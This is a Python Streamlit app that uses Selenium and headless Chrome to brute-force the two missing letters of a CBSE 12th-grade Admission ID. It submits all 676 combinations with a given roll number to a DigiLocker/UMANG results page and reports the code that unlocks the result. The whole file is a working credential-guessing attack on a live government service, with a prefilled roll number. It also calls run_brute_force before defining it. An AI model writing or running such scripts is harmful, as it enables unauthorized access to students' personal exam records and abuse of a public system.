import streamlit as st
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import time
import string

st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
st.title("🔍 CBSE 12th Result Brute Forcer")
st.markdown("### Finds the missing 2 letters in Admission ID")

roll_number = st.text_input("Roll Number", value="18615900", help="Your 8-digit roll number")
known_last_6 = st.text_input("Known Last 6 Characters", value="004511", max_chars=6)
delay = st.slider("Delay between attempts (seconds)", 1.5, 4.0, 2.2)

if st.button("🚀 Start Brute Force", type="primary"):
    if len(known_last_6) != 6:
        st.error("Last 6 characters must be exactly 6 digits/letters.")
    elif not roll_number:
        st.error("Please enter Roll Number.")
    else:
        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)

def run_brute_force(roll_number, known_last_6, delay):
    status = st.empty()
    progress = st.empty()
    result_box = st.empty()

    options = webdriver.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")

    driver = None
    try:
        driver = webdriver.Chrome(options=options)
        driver.get("https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html")
        
        status.success("✅ Browser started. Searching combinations...")

        letters = string.ascii_uppercase
        count = 0

        for a in letters:
            for b in letters:
                code = f"{a}{b}{known_last_6}"
                count += 1
                
                progress.info(f"**Progress:** {count}/676 | Trying: **{a}{b}** → `{code}`")

                try:
                    # Fill Roll Number
                    rroll = driver.find_element(By.ID, "rroll")
                    rroll.clear()
                    rroll.send_keys(roll_number)

                    # Fill Admission ID
                    admn = driver.find_element(By.ID, "admn_id")
                    admn.clear()
                    admn.send_keys(code)

                    # Submit
                    driver.find_element(By.ID, "submit").click()

                    time.sleep(delay)

                    if is_success(driver):
                        result_box.success(f"""
                        🎉 **SUCCESS FOUND!**

                        **Full Code:** `{code}`
                        **Prefix:** `{a}{b}`
                        """)
                        st.balloons()
                        st.stop()
                        return

                except:
                    continue

        st.error("❌ Completed 676 attempts. Code not found.")

    except Exception as e:
        st.error(f"Error: {str(e)}")
    finally:
        if driver:
            driver.quit()


def is_success(driver):
    try:
        # Check for error message
        error = driver.find_element(By.ID, "err_msg")
        if error.is_displayed() and error.text.strip():
            return False
    except NoSuchElementException:
        pass

    # Success if result content appears
    page_text = driver.page_source.lower()
    success_keywords = ["marks", "subject", "grade", "total", "result", "passed", "percentage"]
    return any(kw in page_text for kw in success_keywords)
